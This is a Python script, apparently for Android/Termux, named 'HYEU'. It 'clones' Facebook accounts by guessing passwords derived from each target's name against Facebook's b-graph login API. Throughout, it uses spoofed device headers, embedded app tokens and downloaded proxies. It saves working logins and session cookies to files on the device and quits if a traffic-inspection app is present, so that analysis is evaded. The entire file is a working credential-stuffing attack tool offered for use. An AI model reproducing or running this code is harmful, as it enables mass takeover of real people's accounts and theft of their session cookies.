fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

import os,base64,zlib,pip,sys,re,requests,time, random, json, string
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from bs4 import BeautifulSoup
from datetime import datetime
	
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('python hye.py')
except:pass
try:
        a = "anar"
        t="tt"
        fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
        if f'com.h{t}pc{a}y.pro' in fileee:
                print('\033[1;37m[×] First uninstall HttpCanary Apk for run tools ')
                exit()
        else:pass
except Exception as e:
                pass

try:
    prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text    
    open('proxies.txt','w').write(proxies)
except Exception as e:
    print('\x1b[1;92m')
	
proxies=open('proxies.txt','r').read().splitlines()

android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass

usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass

tan=('https')
iya=('github')
ani=('Fariya')
love=('mbasic')

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'zh_HK'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'TNT'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm} 

def clear():
	os.system('clear')
def back():
	login()
        
def hyeu(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']       :alif = '2009'
        elif ids[:9] in ['100000000']       :alif = '2009'
        elif ids[:8] in ['10000000']        :alif = '2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = '2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:alif = '2010'
        elif ids[:6] in ['100001']          :alif = '2010-2011'
        elif ids[:6] in ['100002','100003'] :alif = '2011-2012'
        elif ids[:6] in ['100004']          :alif = '2012-2013'
        elif ids[:6] in ['100005','100006'] :alif = '2013-2014'
        elif ids[:6] in ['100007','100008'] :alif = '2014-2015'
        elif ids[:6] in ['100009']          :alif = '2015'
        elif ids[:5] in ['10001']           :alif = '2015-2016'
        elif ids[:5] in ['10002']           :alif = '2016-2017'
        elif ids[:5] in ['10003']           :alif = '2018-2019'
        elif ids[:5] in ['10004']           :alif = '2019-2020'
        elif ids[:5] in ['10005']           :alif = '2020'
        elif ids[:5] in ['10006','10007','']:alif = '2021'
        elif ids[:5] in ['10008']           :alif = '2022'
        elif ids[:5] in ['10009']           :alif = '2023'
        else:alif=''
    elif len(ids) in [9,10]:
        alif = '2008-2009'
    elif len(ids)==8:
        alif = '2007-2008'
    elif len(ids)==7:
        alif = '2006-2007 '
    elif len(ids) in [13,14]:
        alif = '2023-2024'
    else:alif=''
    return alif

logo="""\33[1;32m


        

                     ██╗  ██╗██╗   ██╗███████╗\n                     ██║  ██║╚██╗ ██╔╝██╔════╝\n                     ███████║ ╚████╔╝ █████╗  \n                     ██╔══██║  ╚██╔╝  ██╔══╝  \n                     ██║  ██║   ██║   ███████╗\n                     ╚═╝  ╚═╝   ╚═╝   ╚══════╝\n                  H         Y         E         U\n══════════════════════════════════════════════════════════════════════"""
                         

def linex():
	print(70*'\033[1;32m═')
def clear():
        os.system('clear')
        print(logo)
user_opt=[]
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]


def menu():
    clear()
    print(' [1] File Cloning')
    linex()
    xd = input(' Choose an option: ')
    if xd in ['1', '01']:
        clear()
        print(' Put file example:  /sdcard/hye.txt  ')
        linex()
        file = input(' Put file path:\033[1; \033[92;1m ')
        try:
            fo = open(file, 'r').read().splitlines()
        except FileNotFoundError:
            print(' File location not found ')
            time.sleep(1)
            menu()
        clear()
        print(' [1] Method 1')
        linex()
        mthd = input(' Choose: ')
        linex()
        plist = []
        print(' Select Password Crack Menu:')
        linex()
        print(' [1] Crack with Automatic Password (35+ pass)\n [2] Crack with Password Choice \n [3] Working Passwords for Cloning ')
        linex()
        ppp = input('\033[1;32m Choose: ')
        if ppp in ['0', '00']:
            plist.append('First123')
            plist.append('First12345')
            plist.append('Firstlast123')
            plist.append('Firstlast12345')
            plist.append('First')
            plist.append('first')
            plist.append('first123')
            plist.append('first1234')
            plist.append('first12345')
            plist.append('first143')
            plist.append('firstlast')
            plist.append('firstlast123')
            plist.append('firstlast12345')
            plist.append('last123')
            plist.append('last12345')
            plist.append('lastfirst123')
            plist.append('lastfirst12345')
        elif ppp in ['1', '01']:
            plist.append('first last')
            plist.append('firstlast')
            plist.append('first')
            plist.append('last')
            plist.append('first123')
            plist.append('first1234')
            plist.append('first12345')
            plist.append('first143')
            plist.append('last123')
            plist.append('last1234')
            plist.append('last12345')
            plist.append('last143')
            plist.append('lastfirst')
            plist.append('last first')
            plist.append('firstlast123')
            plist.append('lastfirst123')
            plist.append('firstlast143')
            plist.append('lastfirst143')
            plist.append('first last123')
            plist.append('last first123')
            plist.append('first last143')
            plist.append('last first143')
            plist.append('firstmaganda')
            plist.append('firstpogi')
            plist.append('lastmaganda')
            plist.append('lastpogi')
            plist.append('firstcute')
            plist.append('lastcute')
            plist.append('first2022')
            plist.append('first2023')
            plist.append('iloveyou')
            plist.append('i love you')
            plist.append('jesus123')
            plist.append('jesus143')
            plist.append('god123')
            plist.append('god143')
            
        elif ppp in ['3', '03']:
            clear()
            print(' \033[1;32mWorking password for Philippines\033[1;37m ')
            linex()
            print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first12345\n [5] first123\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
            
            linex()
            input(' Press enter to back menu ')
            menu()
        else:
            try:
                linex()
                ps_limit = int(input(' How many passwords do you want to add? '))
            except:
                ps_limit = 1
            linex()
            print('\033[1;32m example: first last,firtslast,first123')
            linex()
            for i in range(ps_limit):
                plist.append(input(f'\033[1;32m Put password {i+1}: '))
        #linex()
        ###print(' Do you want to show cookies? (y/n): ')
        #linex()
        ####c = input('\033[1;32m Choose: ')
        #######if (c).lower() == "y":
            ####user_opt.append("c")
        #$$#$$##with tred(max_workers=20) as Aking:
            linex()
            print(' Do you want to show cp accounts? (y/n): ')
        linex()
        cx = input('\033[1;32m Choose: ')
        if cx in ['y', 'Y', 'yes', 'Yes', '1']:
            pcp.append('y')
        else:
            pcp.append('n')
        with tred(max_workers=20) as hye:
            clear()
            total_ids = str(len(fo))
            print(' OKS ACCOUNT SAVE IN — HYEU-OKS.txt')
            print(' COOKIES SAVE IN — HYEU-COOKIES.txt')
            print("\033[1;37m \x1b[38;5; \033[92;1mUSE AIRPLANE MODE EVERY 2 MINS :)\033[1;37m")
            
            linex()
            for user in fo:
                ids, names = user.split('|')
                passlist = plist
                if mthd in ['1', '01']:
                    hye.submit(ffb5, ids, names, passlist,total_ids)
                #######elif mthd in ['2', '02']:
                    ######crack_submit.submit(ffb5, ids, names, passlist)

        print('\033[1;37m')
        linex()
        print(' The process has completed')
        print(' Total OK/CP/2F: ' + str(len(oks)) + '/' + str(len(cps)) + '/' + str(len(twf)))
        linex()
        input(' Press enter to go back ')
        os.system('python axl_scriptforsale.py')
    #######elif xd in ['2','02']:
		    ####tokengetter()
    ########elif xd in ['3','03']:
		    ###file_making()

#b-graph method		
def ffb5(ids,names,passlist,total_ids):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r\033[1;36m HYE PROCESSING \033[1;37m(%s/%s) | \033[1;37m(\033[1;32m%s\033[1;37m/\033[1;91m%s\033[1;37m)\033[1;37m'%(loop,total_ids,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(000000000,999999999))
                        tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
                        accessToken = random.choice(tokenlist)
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        fblc = "zh_HK"
                        fbfw = '1'
                        fbrv = '0'
                        if '350685531728' in accessToken:
                        	fbpn = 'com.facebook.katana'
                        	fban = 'FB4A'
                        else:
                        	fbpn = 'com.facebook.orca'
                        	fban = 'Orca-Android'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";"+"[FBAN/Orca-Android;FBAV/"+fbav+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+fbbv+";FBCR/Nextel;FBMF/Vivo;FBBD/Vivo;FBDV/V1546;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=3.2,width=720,height=1469};FB_FW/1;]"
                        #ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";"+"[FBAN/MessengerLite;FBAV/"+fbav+";FBPN/com.facebook.mlite;FBLC/en_US;FBBV/"+fbbv+";FBCR/Willkommen;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X657B;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1472};]"
                        data = {'adid': adid, 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_SV', 'client_country_code': 'SV', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        head = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        cookie = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[1;32m HYE OKS | '+ids+' | '+pas+' | ['+hyeu(ids)+']\033[1;97m')
                                        open('/sdcard/HYE-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        open('/sdcard/HYE-OKS.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;93m HYE 2F | '+ids+' | '+pas+' | ['+hyeu(ids)+']\033[1;97m')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m HYE CPS | '+ids+' | '+pas+' | ['+hyeu(ids)+']\033[1;97m')
                                                open('/sdcard/HYE-CPS.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/HYE-CPS.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass

menu()                                